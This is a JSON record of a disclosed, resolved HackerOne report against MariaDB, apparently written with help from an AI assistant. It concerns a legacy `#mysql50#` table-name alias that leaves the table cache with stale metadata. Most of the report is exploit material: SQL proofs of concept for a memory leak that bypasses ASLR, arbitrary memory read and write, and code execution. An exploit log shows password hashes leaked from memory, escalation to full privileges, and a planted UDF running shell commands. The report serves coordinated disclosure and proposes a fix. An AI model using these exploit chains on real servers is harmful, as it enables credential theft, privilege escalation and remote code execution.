@@ -1,0 +1,104 @@
+{
+  "id": 3849040,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODQ5MDQw",
+  "url": "https://hackerone.com/reports/3849040",
+  "title": "#mysql50# legacy alias / stale table cache identity mismatch",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-07T17:16:08.612Z",
+  "submitted_at": "2026-07-07T17:16:08.907Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vortfu",
+    "url": "/vortfu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-07T19:47:34.035Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:47:29.079Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> **Note:** a working (but heavily vibecoded mess of a) info leak, privilege escalation, and or remote code execution chain for this issue is available.\n> I recommend not posting anything publicly accessible about this in JIRA until resolved.\n\nMariaDB still supports the `#mysql50#` table-name prefix as a legacy compatibility mechanism to ensure that tables whose on-disk names were created with older MySQL filename-mapping rules can still be accessed.\n\nThe problem is that while `t` and `#mysql50#t` refer to the same underlying table files as far as the storage layer is concerned, the SQL / metadata / cache layers will still treat them as two distinct table identities. A low-privileged schema owner can abuse this behavior and cause the table definition cache to become stale by opening a table through one spelling, `t`, and then replacing or reshaping the table through the other, `#mysql50#t`.\n\nAny future queries may then use the stale `TABLE` / `Field` metadata against the new attacker controlled file data to various effect.\n\n\n## Proof of Concept\n\n```sql\nSELECT VERSION();\n-- 13.1.0-MariaDB\n\nDROP TABLE IF EXISTS t, `#mysql50#t`;\nCREATE TABLE t(id INT, c1 BINARY(32)) ENGINE=MEMORY;\nINSERT INTO t VALUES(1, REPEAT(0x41,32));\n\n-- open / cache the wide table definition\nSELECT 'table-read' AS type, id, LENGTH(c1), HEX(c1) FROM t;\n-- +------------+------+------------+------------------------------------------------------------------+\n-- | type       | id   | LENGTH(c1) | HEX(c1)                                                          |\n-- +------------+------+------------+------------------------------------------------------------------+\n-- | table-read |    1 |         32 | 4141414141414141414141414141414141414141414141414141414141414141 |\n-- +------------+------+------------+------------------------------------------------------------------+\n\n-- recreate the same physical table through the alias with a narrower layout\nDROP TABLE `#mysql50#t`;\nCREATE TABLE `#mysql50#t`(id INT, c1 BINARY(1)) ENGINE=MEMORY;\nINSERT INTO `#mysql50#t` VALUES(2, 0x42);\n\n-- reading through the new narrow alias\nSELECT 'alias-read' AS type, id, LENGTH(c1), HEX(c1) FROM `#mysql50#t` WHERE id=2;\n-- +------------+------+------------+---------+\n-- | alias-read |    2 |          1 | 42      |\n-- +------------+------+------------+---------+\n\n-- reading through the stale wide table leaks adjacent memory\nSELECT 'table-read' AS type, id, LENGTH(c1), HEX(c1) FROM t ORDER BY id;\n-- +------------+------+------------+------------------------------------------------------------------+\n-- | table-read |    1 |         32 | 4141414141414141414141414141414141414141414141414141414141414141 |\n-- | table-read |    2 |         32 | 42414141414141414141416086402F080000005087402F080000000000000000 |\n-- +------------+------+------------+------------------------------------------------------------------+\n```\n\n\n## Suggested Fix\n\nCodex suggests the following (in order of preference)\n- remove `#mysql50#` support completely\n- allow, but only for opening existing legacy files and explicit `ALTER DATABASE ... UPGRADE DATA DIRECTORY NAME`\n- otherwise ... db / table names should be normalized when used in cache keys.\n\nThis should most likely be based off the filename encoding such that the following should work?\n\n```\n`foo`              -> `foo`\n`#mysql50#foo`     -> `foo`\n\n`a/b`              -> `a@002fb`\n`#mysql50#a@002fb` -> `a@002fb`\n```\n\n> **Note:** there is a companion report re: `#mysql50#` / `tablename_to_filename()` issues that might also need to be taken into consideration here.\n\nAdditionally, it's important to note that normalizing the cache key may cause problems with things like `TABLE_SHARE::set_table_cache_key()` which derives `share->db` and `share->table_name` directly from the key.\n\nCodex suggests adding a new helper function to normalize names, conceptually something like:\n\n```c++\nuint make_table_def_cache_key(char *key,\n                              const char *db,\n                              const char *table_name);\n```\n\nand then update the following:\n\n`tdc_create_key()`\n[sql/table_cache.h:107](https://github.com/MariaDB/server/blob/fd8cec54af7a9d79749df25ea70dac695b371641/sql/table_cache.h#L107-L116)\nCurrently packs raw db / table_name. This must call the new canonical builder.\n\n`TABLE_LIST::init_one_table()` / TABLE MDL request init\n[sql/table.h:2539](https://github.com/MariaDB/server/blob/fd8cec54af7a9d79749df25ea70dac695b371641/sql/table.h#L2539-L2564)\nCurrently uses `MDL_REQUEST_INIT(&mdl_request, MDL_key::TABLE, db.str, table_name.str, ...)`\nThis needs a TABLE-specific MDL initializer that uses the canonical table identity otherwise MDL still has split locks even if TDC is fixed.\n\n`get_table_def_key()`\n[server/sql/sql_base.cc:203](https://github.com/MariaDB/server/blob/fd8cec54af7a9d79749df25ea70dac695b371641/sql/sql_base.cc#L203-L217)\nThis can remain as-is only if TABLE MDL keys are already canonical. Otherwise it must stop returning the raw MDL suffix.\n\nDirect `MDL_REQUEST_INIT(... MDL_key::TABLE ...)` call sites in places like:\n```\nsql/sql_admin.cc\nsql/sql_handler.cc\nsql/sql_parse.cc\nsql/sql_table.cc\nsql/sql_show.cc\nsql/sql_db.cc\nsql/sp_head.cc\nsql/ddl_log.cc\nsql/sql_cte.cc\n```\n\nThose should use a wrapper like `MDL_REQUEST_INIT_TABLE_CANONICAL(...)` or similar, so future code does not accidentally reintroduce raw table MDL keys.\n\nQuery-cache filename invalidation\n`Query_cache::filename_2_table_key()` should produce the same canonical key as `make_table_def_cache_key()`, not a sibling format.\n\nAlso Add DDL Collision Checks?\n\nTL;DR - central helper first, TABLE MDL wrapper second, replace tdc_create_key() and direct TABLE-MDL call sites third.\n\n</ai_suggestion>\n\n\n## Exploitability\n\n\nDifferent storage engines, original / replacement table definitions, and or how the tables are used afterwards allow for a multitude of different behaviors to be turned into exploit primitives and chained together to achieve information disclosure, privilege escalation, and or arbitrary code execution. e.g.\n\n### Out-of-bounds read / ASLR bypass helper\n\nA more weaponized version of the poc above uses a whole bunch of wide columns that are then narrowed - leaking more than enough data to effectively bypass ASLR.\n\n```sql\nCREATE TABLE t (id INT, c0 BINARY(255), ..., cN BINARY(255)) ENGINE=MEMORY;\nINSERT INTO t VALUES (REPEAT(0x41,255), ..., REPEAT(0x41, 255));\n...\nINSERT INTO `#mysql50#t` VALUES(2, 0x42, ..., 0x42);\nSELECT HEX(CONCAT(c0, ..., cN)) AS leaked_bytes FROM t;\n```\n\n\n### read-what-where / credential disclosure\n\nThis variant uses stale MyISAM BLOB metadata. \n\nThe old cached table says the field is an out-of-row `TINYBLOB`; the replacement table stores the same bytes inline as `VARBINARY`. When reading through the stale BLOB field, attacker-chosen inline bytes are interpreted as BLOB pointer metadata.\n\n```sql\nCREATE TABLE victim(\n  id INT,\n  v TINYBLOB\n) ENGINE=MyISAM;\n\nINSERT INTO victim VALUES(1, REPEAT(0x41, 16));\n\n-- open / cache the BLOB-shaped table.\nSELECT id FROM victim;\n\nCREATE TABLE repl(\n  id INT,\n  v VARBINARY(16)\n) ENGINE=MyISAM;\n\n-- recreate the same physical table through the alias\nDROP TABLE `#mysql50#victim`;\nRENAME TABLE repl TO `#mysql50#victim`;\n\n-- <addr_le> is the target address (little-endian)\n-- remaining bytes are padding / length-compatible carrier bytes.\nINSERT INTO `#mysql50#victim` VALUES (99, UNHEX('<addr_le><padding>'));\n\n-- we need to flush and repair the table here so we can read the leaked data.\n-- assuming we dont have privs to `FLUSH TABLES`, you can create a lot of tables\n-- (>= `@@table_open_cache`) and run a `SELECT` across each to push any existing\n-- entries out of the open cache (which is mocked by the `vf_flush()` procedure)\nCALL vf_flush();\n-- we might have also been able to use something like the following as well:\n-- SET @sql = CONCAT('ALTER TABLE `#mysql50#victim` COMMENT=''', NOW(6), ''', ALGORITHM=INPLACE, LOCK=NONE');\n-- EXECUTE IMMEDIATE @sql;\n\nREPAIR TABLE `#mysql50#victim`;\n\n-- the stale field treats the inline VARBINARY bytes as a BLOB descriptor and\n-- reads from the specified address\nSELECT id, HEX(v) AS bytes_at_addr FROM `#mysql50#victim` WHERE id = 99;\n```\n\n\n### write-what-where / privilege escalation\n\nThis variant uses stale MEMORY field metadata to overwrite a live `Field_string` object used by an `UPDATE`.\nThe old row is shaped so that, when copied with the stale wide layout, bytes land over the `Field_string` object for the narrow alias table.\n\n```sql\nCREATE TABLE mem(\n  c0 BINARY(255),\n  c1 BINARY(255),\n  c2 BINARY(255),\n  c3 BINARY(255),\n  c4 BINARY(255)\n) ENGINE=MEMORY;\n\n-- these fields contain a staged fake Field_string object at the offset reached\n-- by the stale row copy.  the important forged members are:\n--   vptr          = _ZTV12Field_string + 16\n--   ptr           = destination address\n--   field_length  = write length\n--   table/charset = valid in-process pointers\nINSERT INTO mem VALUES (\n  UNHEX('<fake_Field_string_part_0>'),\n  UNHEX('<fake_Field_string_part_1>'),\n  UNHEX('<fake_Field_string_part_2>'),\n  UNHEX('<fake_Field_string_part_3>'),\n  UNHEX('<fake_Field_string_part_4>')\n);\n\n-- open / cache the original MEMORY shape.\nSELECT COUNT(*) FROM mem;\n\n-- recreate the table\nDROP TABLE `#mysql50#mem`;\nCREATE TABLE `#mysql50#mem`(\n  c0 BINARY(1),\n  ...\n  c63 BINARY(1)\n) ENGINE=MEMORY;\n\n-- the stale copy corrupts the `Field_string` used by this `UPDATE`. `fill_record()`\n-- then calls `Field_string::store()` and writes the payload to the forged ptr.\nUPDATE `#mysql50#mem` SET c0 = 0x5a;\n```\n\n### stale sequence dispatch / control-flow (RCE)\n\nThis variant crosses the ordinary Aria table to `SEQUENCE` boundary. \nThe first `NEXT VALUE FOR` mutates sequence state through stale row/field metadata. A second `NEXT VALUE FOR` in the same statement re-enters sequence handling after that stale write has corrupted live sequence/handler state.\n\n```sql\nCREATE TABLE s(\n  id INT PRIMARY KEY,\n  v VARBINARY(8192)\n) ENGINE=Aria;\n\n-- store forged object/vtable-like data\nINSERT INTO s VALUES(1, UNHEX('<object/vtable-like data>'));\n\n-- open / cache the ordinary table.\nSELECT COUNT(*) AS opened_old_shape FROM s;\n\n-- recreate table as a SEQUENCE\nDROP TABLE `#mysql50#s`;\nCREATE SEQUENCE `#mysql50#s`\n  START WITH 7\n  INCREMENT BY 1\n  CACHE 1\n  ENGINE=Aria;\n\n-- same-statement double evaluation: the first call corrupts live state, the\n-- second call dispatches through that corrupted/stale state.\nSELECT\n  NEXT VALUE FOR `#mysql50#s` AS n1,\n  NEXT VALUE FOR `#mysql50#s` AS n2;\n```\n\nor everything smashed into one poc\n\n```\n==============================================================================\nMariaDB: #mysql50# legacy alias / stale table-cache identity mismatch\nvortfu <vort.fu@gmail.com>\n\ntarget=11.8.8-MariaDB-deb13/aarch64 build=450e330a\n==============================================================================\n\n[*] baseline (low-privilege connection)\n[+] connected user=vortfu sock=127.0.0.1:3306 db=testdb\n[>] mysql> SHOW GRANTS\n    GRANT USAGE ON *.* TO `vortfu`@`localhost` IDENTIFIED BY PASSWORD '*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19'\n    GRANT ALL PRIVILEGES ON `testdb`.* TO `vortfu`@`localhost`\n[-] verify: low-privilege baseline\n[>] mysql> SELECT COUNT(*) AS denied_mysql FROM mysql.global_priv\n[-] mysql.global_priv denied: SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'vortfu'@'localhost' for table `mysql`.`global_priv`\n\n[*] preflight cleanup\n[-] current db=testdb\n[-] dropping sequence, staging, transient, and eviction tables in db=testdb\n[+] cleanup complete pool_tables=0\n\n[*] setting up eviction pool\n[+] eviction tables=2200 db=testdb prefix=seq_fv_evict_\n[-] sizing source=auto: max(2200, @@table_open_cache + 200) table_open_cache=2000\n[+] eviction pool ready\n\n[*] bypassing ASLR\n[-] recovering image base via MEMORY inverse leak\n[+] image_base=0xaaaae75d0000\n[-] verify: image base readback\n[-] readback @base head=7f454c46020101030000000000000000\n[-] verdict ELF64_OK\n\n[*] leaking credentials from memory\n[+] acl_users=0xaaaae8f62120 buffer=0xaaaaebac18c8 elements=12\n[-] decoded ACL account cache entries\n    user=bx             access=0x0           password=*B0F98AC2BC83A72D35365B50FFFDB90CD41275F5\n    user=fdw            access=0x0           password=*7B9EBEED26AA52ED10C0F549FA863F13C39E0209\n    user=mariadb.sys    access=0x0           password=\n    user=mrprobe        access=0x0           password=\n    user=mysql          access=0xffffffffff  password=invalid\n    user=power          access=0x0           password=*7B9EBEED26AA52ED10C0F549FA863F13C39E0209\n    user=procwriter     access=0x0           password=*7B9EBEED26AA52ED10C0F549FA863F13C39E0209\n    user=root           access=0xffffffffff  password=invalid\n    user=vortfu         access=0x0           password=*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19\n    user=vortfu_mr      access=0x0           password=\n    user=vortfu_tmp     access=0x0           password=\n    user=vortfutest     access=0x0           password=*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19\n\n[*] active connections\n[+] server_threads=0xaaaae8f5f238 first=0xf7ff80004478\n    thread_id=28   user=vortfu     access=0x0           THD=0xf7ff80004478 &master_access=0xf7ff80006ba0\n    thread_id=2    user=           access=0x0           THD=0xf7ff78000c78 &master_access=0xf7ff780033a0\n    thread_id=1    user=           access=0x0           THD=0xf7ff74000c78 &master_access=0xf7ff740033a0\n\n[*] privilege escalation: master_access self-write\n[+] targeting master_access=0xf7ff80006ba0 (user=vortfu thread=28)\n[+] payload=0x0000ffffffffff bits=40 effect=FULL_PRIV_BITMAP\n[-] writing payload to target address\n[-] verify: master_access readback\n[-] readback 0xf7ff80006ba0=0xffffffffff\n[-] verdict FULL_PRIVS\n[>] mysql> SELECT COUNT(*) AS visible_global_priv_rows FROM mysql.global_priv\n    12\n[+] global privilege table read now succeeds on the same connection\n[+] current thread 28 access upgraded to 0xffffffffff\n\n[*] RCE path A: planted UDF plugin\n[>] mysql> SELECT @@plugin_dir AS plugin_dir\n    /usr/lib/mysql/plugin/\n[+] wrote UDF shared object to /tmp/udf_exec_3097.so\n[-] overwriting opt_plugin_dir=0xaaaae8f640b8 -> /tmp\n[>] mysql> SELECT @@plugin_dir AS plugin_dir\n    /tmp\n[>] mysql> CREATE OR REPLACE FUNCTION `udf_exec` RETURNS STRING SONAME 'udf_exec_3097.so'\n[>] mysql> SELECT `udf_exec`('uname -a; id') AS udf_output\n    Linux debian 6.12.90+deb13.1-arm64 #1 SMP Debian 6.12.90-2 (2026-05-27) aarch64 GNU/Linux\n    uid=101(mysql) gid=104(mysql) groups=104(mysql)\n\n[*] RCE path B: staged fake Field/vtable and sequence dispatch\n[+] fake vtable call target=system_pivot(image+0x73b6e0 -> libc system) addr=0xaaaae7d0b6e0\n[-] system_pivot uses QUICK_INDEX_INTERSECT_SELECT::get_next to call system(fake_field+0xb0)\n[+] returnable Field_long mode: copied Field_long vtable=0xaaaae8d616b0 patched_val_int_slot+0xc8=0xaaaae7d0b6e0\n[-] system_pivot cmd='uname -a; id' cmd_addr=0xf7ff82fa01b0 system=0xffffadd19380\n[-] stage table=`testdb`.`seq_field_stage` TABLE=0xf7ff807c9818 record0=0xf7ff82f953d0\n[-] fake_field[0]=0xf7ff82fa0100 patched_vtable=0xf7ff82fa0d00 value_cells=0xf7ff82fa1100\n[+] verify field0.vptr=0xf7ff82fa0d00 patched_vtable[0xc8]=0xaaaae7d0b6e0 system_target=0xffffadd19380 values=0000000000000000ffffff7f0000000001000000010000000000000000000000\n[-] field_array_skip_qwords=9: padding fake Field* array before expected table->field landing zone\n[+] returnable Field_long array: field[0] runs system_pivot, fields[1..7] return staged sequence values\n[+] misaligned load target fake Field*=0xf7ff82fa0100 encoded_qword=0x01000000f7ff82fa\n\n[*] preparing controlled sequence backing row\n[-] expected controlled table->field[0] / x0 = 0x0000f7ff82fa0100\n[-] SQL qword encoding for misaligned load = 0x01000000f7ff82fa\n[-] payload qword filler = 0x01000000f7ff82fa\n\n[*] swapping the alias onto real SEQUENCE metadata\n\n[*] triggering sequence RCE path\n[>] mysql> SELECT NEXT VALUE FOR `testdb`.`#mysql50#seq_field_vptr` AS n_alias\n    0\n\n[*] SUCCESS - check mariadbd stdout/journald for any command output\n\n[*] cleanup: best-effort artifact and table cleanup\n[-] removing dumped UDF shared object /tmp/udf_exec_3097.so\n[>] mysql> SELECT `udf_exec`('rm -f \\'/tmp/udf_exec_3097.so\\'') AS udf_file_cleanup\n    [exit_status=0]\n[-] dropping UDF function udf_exec\n[+] UDF function udf_exec is no longer registered\n[-] restoring opt_plugin_dir=0xaaaae8f640b8 -> /usr/lib/mysql/plugin/\n[-] verify: plugin_dir restored\n[>] mysql> SELECT @@plugin_dir AS plugin_dir\n    /usr/lib/mysql/plugin/\n[-] dropping sequence, staging, transient, and eviction tables in db=testdb\n[+] cleanup complete pool_tables=2200\n```\n\n(also tested against `mariadb-13.1.0-osx-arm64-release`)\n\n## Impact\n\npwned :(",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-07T19:47:29.410Z",
+  "allow_singular_disclosure_after": -4904.520854179,
+  "singular_disclosure_allowed": true,
+  "vote_count": 0,
+  "voters": [],
+  "structured_scope": {
+    "databaseId": 10334,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Remote Code Execution",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
